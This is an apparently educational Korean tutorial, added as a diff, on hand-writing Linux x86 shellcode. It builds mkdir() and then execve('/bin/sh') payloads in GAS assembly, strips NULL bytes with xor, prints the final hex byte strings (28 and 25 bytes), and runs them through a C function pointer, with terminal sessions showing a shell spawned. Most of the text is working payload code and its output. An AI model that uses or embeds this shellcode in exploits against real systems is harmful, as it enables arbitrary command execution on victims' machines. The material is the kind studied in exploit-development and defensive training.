@@ -1,0 +1,529 @@
+------------------------------------------------------------------------
+-        Using a pointer to a function to execute shellcode            -
+-                                                                      -
+-                        <? $eMail = "indra"."\x40"."linux.co.kr"; ?>  -
+-                                                                      -
+-                                       http://indra.linuxstudy.pe.kr  -
+------------------------------------------------------------------------
+
+--[ mkdir() function ]
+0x00. 시작
+0x01. 기본사항 - 1
+0x02. 기본사항 - 2
+0x03. assembly code 제작
+0x04. objdump
+0x05. NULL 제거
+0x06. Release
+
+--[execve() function ]
+0x07. execve() release
+0x08. Reference
+
+0x00. 시작
+~~~~~~~~~~
+mkdir() 을 쉘코드로 만드는 법을 알아봅니다.
+mkdir() 예제 c code 는 다음과 같습니다.
+
+----------------- [ 1.c ]
+#include <unistd.h>
+
+int main()
+{
+    mkdir("test", 0700);
+    exit(0);
+}
+----------------- [ 1.c ]
+
+; 사족이지만 웬만하면 문서의 글이 한 라인에 80 컬럼을 넘지 않도록 하기 위해
+; 부단히 애를 썼습니다.
+; code 도 아닌데 80 컬럼 넘으면 어떠냐는 분도 계실수 있는데,
+; 뭐~~ 제 개인적인 사항입니다~
+; 개인적으로 문서의 글이 옆으로 주욱 늘여진 문서는 보기 싫어져서요. 크크.. :)
+
+0x01. 기본사항 - 1
+~~~~~~~~~~~~~~~~~~
+
+특정 함수를 실행하는데 필요한 레지스터는 많지만
+중요한것은 eax ~ edx 에 해당하는 레지스터 입니다.
+
+또한 함수의 실행은 항상 정해진 system call 의 번호로 구별되어 실행됩니다.
+해당 system call table 을 볼수 있는 파일은 "/usr/include/asm/unistd.h" 입니다.
+이 system call number 는 항상 '%eax' 레지스터에 저장되어 있어야 하며,
+이를 "int $0x80" 이라는 *고유의* 인터럽트 콜에 의해 실행할수 있습니다.
+
+(인터럽트 콜의 방법은 제 각기 다르며, 기본 solaris 에서의 인터럽트 콜 방법은
+ lcall 입니다. 다만 lcall 사용시 NULL 처리의 방법이 까다롭다는것을 감안해
+ solaris shellcode 의 제작자는 변칙적인 방법으로 lcall 과 같은 동작을
+ 할 수 있게 합니다. 뭐.. 여담이었습니다..)
+
+위 코드의 disassemble 결과를 보면 다음과 같다는 것을 알수 있습니다.
+
+(push 는 값을 stack 에 저장합니다. 
+ 따라서 다음과 같은 형태로 stack 에 data 가 쌓이게 됩니다.)
+
+        stack data
++--------------------------+
+|  0700 - permission 부분  |
++--------------------------+
+| "test" 문자열의 address  |
++--------------------------+
+
+이 후에 call 명령으로 mkdir 함수를 call 합니다.
+system call number 는 항상 eax 에 저장된다고 이야기 하였습니다.
+그러므로 문자열의 address 다음 부분에는 system call number 가 들어가게 됩니다.
+따라서 stack data 는 다음과 같이 표현되어 질수 있습니다.
+
++----------+----------------------------+
+| register |         description        |
++==========+============================+
+|   %ecx   |    0700 - permission 부분  |
++----------+----------------------------+
+|   %ebx   |  "test" 문자열의 address   |
++----------+----------------------------+
+|   %eax   |     system call number     |
++----------+----------------------------+
+
+참고로 assembly 에서는 모든 계산이 16진수로 이루어 집니다.
+
+0x02. 기본사항 - 2
+~~~~~~~~~~~~~~~~~~
+
+이번에는 assembly code 를 만들기 전 알아야 할 몇가지 사항을 알아봅니다.
+
+- 아래는 "Linux Assembly Howto" 에서 인용/발췌 하였습니다.
+(URL : "http://wiki.kldp.org/HOWTO//html/Assembly-HOWTO/gas.html#AEN372")
+
+1. 보통 linux 에서는 gcc 가 기본 C compiler 로 지정되어 있으며,
+   이 gcc 에서 사용하는 GNU 어셈블러는 GAS 라고 부릅니다.
+   
+2. 레지스터 표기법은 % 문자로 시작한다.
+
+3. 상수 표기법은 $ 문자로 시작한다.
+
+4. % 나 $ 같은 접두어가 없을 경우 메모리주소를 의미한다.
+  
+5. 오퍼랜드의 순서가 intel assembly 와는 반대이다.
+   즉, source 가 먼저오고 destination 이 뒤에 온다.
+   
+6. 오퍼랜드의 크기가 인스트럭션의 접미어로 붙는다. 가능한 접미어는 
+   b 는 "byte" 를, w 는 "word" 를, l 은 "long" 을 나타내는 접미어다.
+
+7. 인덱싱이나 간접 주소지정 방식은 인덱스 레지스터를 이용하거나 간접 메모리
+   주소의 번지를 괄호 안에 넣음으로 표현되어 진다.
+
+위의 내용을 알아야 shellcode 를 작성하는 과정을 거칠수 있고,
+참고로 6 번 내용은 후에 shellcode 를 만들어 낸 후, NULL 을 제거하는 과정에서
+필요한 사항이니 필히 참고하기 바랍니다.
+
+또한 %esp, %ebp 레지스터들은 기존에 어셈을 공부하신 분이라면 아시겠지만
+Stack Pointer, Base Pointer 를 나타냅니다.
+SP, BP 가 80386 이후에 32비트 로의 확장 개념이 덧붙여져
+ESP,EBP 로 불리게 된 것으로 개념은 같습니다.
+
+0x03. assembly code 제작
+~~~~~~~~~~~~~~~~~~~~~~~~
+
+2 번 항목에서 잠깐 봤던것을 되살려 보면 구조는 다음과 같습니다.
+
+ecx = permission
+ebx = string address
+eax = system call
+
+assembly code 에서 모든 값의 전달과정은 16 진수로 하는것을 주의해야 합니다.
+
+또 한가지 string address 를 레지스터에 담는 과정은 pop/call 을 사용하지 않고,
+push 명령을 사용하여 stack 에 저장 한 후 %esp 레지스터에서 
+address 를 가져오는 방법을 사용합니다.
+만들어진 코드의 실행 역시, 기존의 main() function 위에 자리잡은 
+return address 를 shellcode 의 address 로 변경하는 방법이 아닌 
+함수포인터를 이용하여 실행하게 됩니다.
+
+-------------------- [ 1.s ]
+0: .globl main
+1: main:
+2:     movl    $0x1c0, %ecx
+3:     push    $0x00
+4:     push    $0x74736574
+5:     movl    %esp, %ebx
+6:     movl    $0x27, %eax
+7:     int     $0x80
+8:     movl    $0x0, %ebx
+9:     movl    $0x1, %eax
+10:    int     $0x80
+-------------------- [ 1.s ]
+
+각 코드를 한 라인씩 살펴보면 다음과 같습니다.
+
+0: main 정의.
+1: main 시작.
+2: 퍼미션 700 (8진수) 을 16진수로 변환한 값을 %ecx 레지스터에 저장.
+3: 문자열의 끝을 나타내기 위해 NULL(0x00) 을 stack 에 저장.
+4: 문자열 "test" 를 16진수로 만들어 stack 에 저장.
+5: %esp 레지스터는 Stack Pointer 의 특성을 이용하여, 
+   %ebx 에 stack 의 최종주소 저장.
+6: mkdir 의 system call number 인 0x27 을 %eax 레지스터에 저장.
+7: mkdir 인터럽트.
+8: exit() 의 인자로 사용할 0 을 %ebx 에 저장.
+9: exit() 의 system call number 를 %eax 에 저장.
+10: exit 인터럽트.
+
+5 번에서 "test" 문자열을 16진수로 바꿀때는 
+프로그램 하나를 만들어 이용하였습니다
+그 프로그램은 다음과 같습니다.
+
+------------------ [ replace.c ]
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    int i;
+    char buf[1024];
+
+    for(;;) {
+        memset(buf, 0, sizeof(buf));
+        printf("String: ");
+        fgets(buf, sizeof(buf), stdin);
+
+        buf[strlen(buf) - 1] = '\0';
+
+        printf("\nbuf: %s - ", buf);
+
+        i = strlen(buf) - 1;
+
+        for(;;) {
+            if(i == -1) break;
+            printf("\\x%02x", buf[i]);
+            i--;
+        }
+        printf("\n");
+    }
+}
+------------------ [ replace.c ]
+
+위 프로그램은 문자열을 입력받아 문자 하나당 16진수 코드 하나로 변환하여
+출력하는 프로그램 입니다.
+
+그럼 위 1.s assembly 프로그램이 잘 작동 되는지 확인합니다.
+
+indra@ damn> cat 1.s
+.globl main
+
+main:
+    movl    $0x1c0, %ecx
+    push    $0x00
+    push    $0x74736574
+    movl    %esp, %ebx
+    movl    $0x27, %eax
+    int     $0x80
+    movl    $0x0, %ebx
+    movl    $0x1, %eax
+    int     $0x80
+indra@ damn> cc -o 1 1.s
+indra@ damn> ls -al test
+ls: test: 그런 파일이나 디렉토리가 없음
+indra@ damn> ./1
+indra@ damn> ls -al test
+합계 8
+drwx------    2 indra    indra        4096  2월 10 12:33 .
+drwx------    3 indra    indra        4096  2월 10 12:33 ..
+indra@ damn>
+
+네, 작동이 잘 되었다는것을 확인할수 있습니다.
+
+0x04. objdump
+~~~~~~~~~~~~~
+
+objdump 란 말 그대로 object파일을 덤프하여 출력해 주는 프로그램입니다.
+objdump 는 ELF file format 에 표준한 여러 table 들과 section 에 따른
+데이타들을 출력해 줍니다.
+여기서는 objdump 의 -S 옵션을 사용하며, 더 자세한 사항은 objdump --help 나
+man objdump 를 참조 바랍니다.
+
+objdump 를 이용해 main 에 해당하는 기계어 코드를 볼수 있었습니다.
+그러나 이 기계어 코드안에는 NULL(0x00) 이 포함되어 있습니다.
+일반적으로 shellcode 실행시 NULL 이 포함되어 있다면 NULL 을 만나는
+부분에서 실행이 멈춰버립니다.
+이러한 것을 피하기 위해 NULL 을 없애는 작업이 필요합니다.
+
+0x05. NULL 제거
+~~~~~~~~~~~~~~~
+
+NULL 제거는 xor 논리합 연산을 통해 0x00000000 코드를 생성하는 방법으로 
+진행하게 됩니다.
+한동훈님의 "인라인 어셈블리를 분석하자" 
+(URL : "http://www.ezdoum.com/upload/21/20020519002154/inlineasm.txt")
+의 문서에 따르면 xor 연산에 대해 다음과 같이 정의하고 있습니다.
+
+"xor는 두 비트가 서로 다르면 1이 되고 같으면 0이 되는 배타적 논리합 연산자이다."
+"xor는 비트단위로 수행되며 xor의 결과는 뒤의 피연산자에게 되돌려지며"
+"그 값에 따라 각 플래그의 값이 변경된다."
+"자신의 값으로 xor를 하면 당연히 0가 된다." 
+
+즉, 자기 자신의 값을 xor 연산을 하여, 
+movl $0x00, %(register) 를 대신하는 코드를 생성해낼수 있습니다.
+
+또한 "기본사항 - 2" 의 6번 항목에서 
+'오퍼랜드의 크기가 인스트럭션의 접미사로 붙는다' 라고 알아보았습니다.
+이 부분에 대해 명확히 알아보면
+
+"*b" 는 "byte" 형이며, 이때의 레지스터명은 "%al" 를 사용합니다.
+"*w" 는 "word" 형이며, 이때의 레지스터명은 "%ax" 를 사용합니다.
+"*l" 는 "long" 형이며, 이때의 레지스터명은 "%eax" 를 사용합니다.
+
+이것을 잘 기억해 두도록 합니다.
+
+그럼 NULL 을 제거하는 과정을 봅니다.
+
+indra@ damn> objdump -S ./1 | more
+...
+080482f4 <main>:
+ 80482f4:       b9 c0 01 00 00          mov    $0x1c0,%ecx
+ 80482f9:       6a 00                   push   $0x0
+ 80482fb:       68 74 65 73 74          push   $0x74736574
+ 8048300:       89 e3                   mov    %esp,%ebx
+ 8048302:       b8 27 00 00 00          mov    $0x27,%eax
+ 8048307:       cd 80                   int    $0x80
+ 8048309:       bb 00 00 00 00          mov    $0x0,%ebx
+ 804830e:       b8 01 00 00 00          mov    $0x1,%eax
+ 8048313:       cd 80                   int    $0x80
+...
+indra@ damn> cp 1.s 2.s
+indra@ damn> vi 2.s
+#080482f4 <main>:
+# 80482f4:       b9 c0 01 00 00          mov    $0x1c0,%ecx
+# 80482f9:       6a 00                   push   $0x0
+# 80482fb:       68 74 65 73 74          push   $0x74736574
+# 8048300:       89 e3                   mov    %esp,%ebx
+# 8048302:       b8 27 00 00 00          mov    $0x27,%eax
+# 8048307:       cd 80                   int    $0x80
+# 8048309:       bb 00 00 00 00          mov    $0x0,%ebx
+# 804830e:       b8 01 00 00 00          mov    $0x1,%eax
+# 8048313:       cd 80                   int    $0x80
+
+.globl main
+
+main:
+    xorl    %ecx, %ecx
+    movl    %ecx, %eax
+    push    %ecx
+    movw    $0x1c0, %cx
+    push    $0x74736574
+    movl    %esp, %ebx
+    movb    $0x27, %al
+    int     $0x80
+    xorl    %ebx, %ebx
+    movl    %ebx, %eax
+    movb    $0x1, %al
+    int     $0x80
+~
+~
+:wq!
+indra@ damn> cc -o 2 2.s
+indra@ damn> ls -al test
+ls: test: 그런 파일이나 디렉토리가 없음
+indra@ damn> ./2
+indra@ damn> ls -al test
+합계 8
+drwx------    2 indra    indra        4096  2월 10 17:01 .
+drwx------    3 indra    indra        4096  2월 10 17:01 ..
+indra@ damn> objdump -S ./2 | less
+...
+080482f4 <main>:
+ 80482f4:       31 c9                   xor    %ecx,%ecx
+ 80482f6:       89 c8                   mov    %ecx,%eax
+ 80482f8:       51                      push   %ecx
+ 80482f9:       66 b9 c0 01             mov    $0x1c0,%cx
+ 80482fd:       68 74 65 73 74          push   $0x74736574
+ 8048302:       89 e3                   mov    %esp,%ebx
+ 8048304:       b0 27                   mov    $0x27,%al
+ 8048306:       cd 80                   int    $0x80
+ 8048308:       31 db                   xor    %ebx,%ebx
+ 804830a:       89 d8                   mov    %ebx,%eax
+ 804830c:       b0 01                   mov    $0x1,%al
+ 804830e:       cd 80                   int    $0x80
+indra@ damn>
+
+0x06. Release
+~~~~~~~~~~~~~
+
+마지막으로 NULL 을 제거한 code 가 정상작동 하는지 확인합니다.
+
+indra@ damn> vi mkdir-final.c
+#include <stdio.h>
+
+char    damn[] =
+        "\x31\xc9\x89\xc8\x51\x66\xb9\xc0\x01\x68"
+        "\x74\x65\x73\x74\x89\xe3\xb0\x27\xcd\x80"
+        "\x31\xdb\x89\xd8\xb0\x01\xcd\x80";
+
+int main()
+{
+    void(*func)();
+    func = (void*)damn;
+    printf("%d bytes code.\n", strlen(damn));
+    func();
+}
+~
+~
+:wq!
+indra@ damn> cc -o mkdir-final mkdir-final.c
+indra@ damn> ls -al test
+ls: test: 그런 파일이나 디렉토리가 없음
+indra@ damn> ./mkdir-final
+28 bytes code.
+indra@ damn> ls -al test
+합계 8
+drwx------    2 indra    indra        4096  2월 10 17:11 .
+drwx------    3 indra    indra        4096  2월 10 17:11 ..
+indra@ damn>
+
+28바이트 코드를 만들었습니다.
+잘 작동하는군요.. :)
+
+0x07. execve() release
+~~~~~~~~~~~~~~~~~~~~~~
+
+indra@ damn> vi 1.s
+# execve("/bin/sh", "/bin/sh\0", NULL);
+.globl main
+
+main:
+    xorl    %edx, %edx      # NULL 생성
+    push    %edx            # NULL 을 stack 에 저장
+    push    $0x68732f2f     # "//sh" 문자열을 stack 에 저장
+    push    $0x6e69622f     # "/bin" 문자열을 stack 에 저장
+    movl    %esp, %ebx      # esp 레지스터의 값을 ebx 레지스터에 복사
+    push    %edx            # 다시한번 NULL 을 stack 에 저장
+    push    %ebx            # ebx 레지스터의 값을 stack 에 저장
+    movl    %esp, %ecx      # NULL 이 포함된 execve() 의 두번째 매개변수
+    movl    $0x0b, %eax     # execve() 의 시스템 콜 넘버를 eax 레지스터에 저장
+    int     $0x80           # 인터럽트 콜
+~
+~
+~
+~
+~
+~
+~
+~
+~
+"1.s" [새로운] 14L, 660C 저장 했습니다
+indra@ damn> cc -o 1 1.s
+indra@ damn> ./1
+sh-2.05b$ ps
+  PID TTY          TIME CMD
+19721 ttyp0    00:00:00 bash
+20783 ttyp0    00:00:00 sh
+20795 ttyp0    00:00:00 ps
+sh-2.05b$ exit
+exit
+indra@ damn> objdump -S ./1 | less
+...
+0804830c <main>:
+ 804830c:       31 d2                   xor    %edx,%edx
+ 804830e:       52                      push   %edx
+ 804830f:       68 2f 2f 73 68          push   $0x68732f2f
+ 8048314:       68 2f 62 69 6e          push   $0x6e69622f
+ 8048319:       89 e3                   mov    %esp,%ebx
+ 804831b:       52                      push   %edx
+ 804831c:       53                      push   %ebx
+ 804831d:       89 e1                   mov    %esp,%ecx
+ 804831f:       b8 0b 00 00 00          mov    $0xb,%eax
+ 8048324:       cd 80                   int    $0x80
+...
+
+indra@ damn> cp 1.s 2.s
+indra@ damn> vi 2.s
+# execve("/bin/sh", "/bin/sh\0", NULL);
+.globl main
+
+main:
+    xorl    %edx, %edx      # NULL 생성
+    movl    %edx, %eax      # 이미 xorl 연산이 된 edx 를 eax 에 복사 (추가부분)
+    push    %edx            # NULL 을 stack 에 저장
+    push    $0x68732f2f     # "//sh" 문자열을 stack 에 저장
+    push    $0x6e69622f     # "/bin" 문자열을 stack 에 저장
+    movl    %esp, %ebx      # esp 레지스터의 값을 ebx 레지스터에 복사
+    push    %edx            # 다시한번 NULL 을 stack 에 저장
+    push    %ebx            # ebx 레지스터의 값을 stack 에 저장
+    movl    %esp, %ecx      # NULL 이 포함된 execve() 의 두번째 매개변수
+    movb    $0x0b, %al      # execve() 의 시스템 콜 넘버를 eax 레지스터에 저장
+                            # (변경부분)
+    int     $0x80           # 인터럽트 콜
+~
+~
+~
+~
+~
+~
+~
+"2.s" 16L, 781C 저장 했습니다
+indra@ damn> cc -o 2 2.s
+indra@ damn> ./2
+sh-2.05b$ ps
+  PID TTY          TIME CMD
+19721 ttyp0    00:00:00 bash
+20862 ttyp0    00:00:00 sh
+20874 ttyp0    00:00:00 ps
+sh-2.05b$ exit
+exit
+indra@ damn> objdump -S ./2 | less
+...
+0804830c <main>:
+ 804830c:       31 d2                   xor    %edx,%edx
+ 804830e:       89 d0                   mov    %edx,%eax
+ 8048310:       52                      push   %edx
+ 8048311:       68 2f 2f 73 68          push   $0x68732f2f
+ 8048316:       68 2f 62 69 6e          push   $0x6e69622f
+ 804831b:       89 e3                   mov    %esp,%ebx
+ 804831d:       52                      push   %edx
+ 804831e:       53                      push   %ebx
+ 804831f:       89 e1                   mov    %esp,%ecx
+ 8048321:       b0 0b                   mov    $0xb,%al
+ 8048323:       cd 80                   int    $0x80
+...
+indra@ damn> vi sh.c
+char    damn[] =
+        "\x31\xd2\x89\xd0\x52\x68\x2f\x2f\x73\x68"
+        "\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89"
+        "\xe1\xb0\x0b\xcd\x80";
+
+int main()
+{
+    void(*func)();
+    func = (void*)damn;
+    printf("%d bytes shellcode.\n", strlen(damn));
+    func();
+}
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+"sh.c" 11L, 215C 저장 했습니다
+indra@ damn> cc -o sh sh.c
+indra@ damn> ./sh
+25 bytes shellcode.
+sh-2.05b$ ps
+  PID TTY          TIME CMD
+20005 pts/0    00:00:00 bash
+20045 pts/0    00:00:00 sh
+20046 pts/0    00:00:00 ps
+sh-2.05b$
+
+0x08. Reference
+~~~~~~~~~~~~~~~
+
+- Introduction to Linux x86 shellcode - posidron
+- 인라인 어셈블리를 분석하자 - 한동훈
+- Linux Assembly Howto - Konstantin Boldyshev (역: 김영휘; 라키시스)
+
+[=- End of File -=]
